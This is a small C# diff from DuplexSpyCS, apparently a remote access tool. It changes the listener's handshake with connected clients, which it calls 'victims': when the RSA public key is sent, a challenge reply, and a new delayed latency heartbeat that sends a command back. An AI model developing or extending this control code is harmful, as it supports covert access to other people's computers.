@@ -185,9 +185,6 @@ namespace DuplexSpyCS
                 var config = clsStore.sql_conn.fnGetListener(m_szName);
                 victim.Send(new clsHttpResp(config).fnGetBytes());
 
-                //Send RSA public key.
-                victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(szRsaPublicKey)).fnGetBytes());
-
                 while (m_bIslistening)
                 {
                     try
@@ -224,8 +221,8 @@ namespace DuplexSpyCS
                         {
                             if (nParam == 0)
                             {
-                                
-                                
+                                //Send RSA public key.
+                                victim.Send(new clsHttpResp(1, 0, clsCrypto.b64E2Str(szRsaPublicKey)).fnGetBytes());
                             }
                             else if (nParam == 1)
                             {
@@ -255,6 +252,8 @@ namespace DuplexSpyCS
                                 if (string.Equals(payload, victim.challenge_text))
                                 {
                                     victim.Send(new clsHttpResp(1, 4, clsEZData.fnGenerateRandomStr()).fnGetBytes());
+
+                                    //victim.fnSendCmdParam(2, 1);
                                 }
                             }
                         }
@@ -279,6 +278,22 @@ namespace DuplexSpyCS
                                 victim.Send(abBuffer);
 
                                 clsStore.sent_bytes += abBuffer.Length;
+                            }
+                            else if (nParam == 1)
+                            {
+                                _ = Task.Run(() =>
+                                {
+                                    DateTime datetime = DateTime.Now;
+
+                                    int nDelay = 5000;
+                                    Thread.Sleep(nDelay);
+
+                                    TimeSpan span = datetime - victim.last_sent;
+                                    victim.latency_time = span.Milliseconds;
+                                    victim.last_sent = datetime;
+
+                                    victim.fnSendCmdParam(2, 1);
+                                });
                             }
                         }
                     }
